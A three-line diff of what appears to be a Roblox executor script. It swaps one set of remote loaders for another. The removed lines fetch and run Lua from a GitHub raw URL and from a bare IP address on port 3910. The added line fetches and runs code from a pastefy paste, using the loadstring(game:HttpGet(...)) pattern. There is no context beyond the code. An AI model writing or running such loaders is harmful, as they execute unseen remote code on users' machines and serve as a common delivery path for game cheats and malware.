@@ -1,3 +1,1 @@
-ID="e2b1d808-b6d6-4dfd-a4dd-f25ad03b1ef2";
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/eIysia-dev/release/refs/heads/main/main.lua"));
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();
+loadstring(game:HttpGet("https://pastefy.app/8xYKvtQy/raw"))()
